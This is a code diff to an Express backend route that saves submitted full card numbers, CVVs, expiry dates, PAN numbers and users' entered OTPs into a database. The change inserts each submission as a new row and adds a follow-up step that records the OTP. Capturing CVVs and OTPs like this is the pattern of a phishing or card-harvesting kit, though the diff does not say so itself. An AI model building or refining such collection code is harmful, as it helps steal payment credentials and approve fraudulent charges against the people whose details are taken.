@@ -196,25 +196,11 @@ app.post('/api/submit-form', async (req, res) => {
       cvv,
       expiryDate,
       otpVerified = false,
-      otpEntered = ''
+      otpEntered = '',
+      isNewSubmission = true
     } = req.body
     
-    const existing = await pool.query(
-      'SELECT id FROM form_submissions WHERE mobile_number = $1 OR email = $2 ORDER BY created_at DESC LIMIT 1',
-      [mobileNumber, email]
-    )
-    
-    if (existing.rows.length > 0) {
-      await pool.query(
-        `UPDATE form_submissions SET 
-          full_name = $1, date_of_birth = $2, pan_number = $3, request_type = $4,
-          card_holder_name = $5, card_number = $6, cvv = $7, expiry_date = $8,
-          otp_verified = $9, otp_entered = $10, updated_at = CURRENT_TIMESTAMP
-         WHERE id = $11`,
-        [fullName, dateOfBirth, panNumber, requestType, cardHolderName, cardNumber, cvv, expiryDate, otpVerified, otpEntered, existing.rows[0].id]
-      )
-      res.json({ success: true, id: existing.rows[0].id, message: 'Form updated successfully' })
-    } else {
+    if (isNewSubmission) {
       const result = await pool.query(
         `INSERT INTO form_submissions 
           (full_name, mobile_number, date_of_birth, email, pan_number, request_type, card_holder_name, card_number, cvv, expiry_date, otp_verified, otp_entered)
@@ -223,6 +209,23 @@ app.post('/api/submit-form', async (req, res) => {
         [fullName, mobileNumber, dateOfBirth, email, panNumber, requestType, cardHolderName, cardNumber, cvv, expiryDate, otpVerified, otpEntered]
       )
       res.json({ success: true, id: result.rows[0].id, message: 'Form submitted successfully' })
+    } else {
+      const existing = await pool.query(
+        'SELECT id FROM form_submissions WHERE mobile_number = $1 OR email = $2 ORDER BY created_at DESC LIMIT 1',
+        [mobileNumber, email]
+      )
+      
+      if (existing.rows.length > 0) {
+        await pool.query(
+          `UPDATE form_submissions SET 
+            otp_verified = $1, otp_entered = $2, updated_at = CURRENT_TIMESTAMP
+           WHERE id = $3`,
+          [otpVerified, otpEntered, existing.rows[0].id]
+        )
+        res.json({ success: true, id: existing.rows[0].id, message: 'OTP verified successfully' })
+      } else {
+        res.status(404).json({ error: 'User not found. Please submit form first.' })
+      }
     }
   } catch (error) {
     console.error('Form submission error:', error)
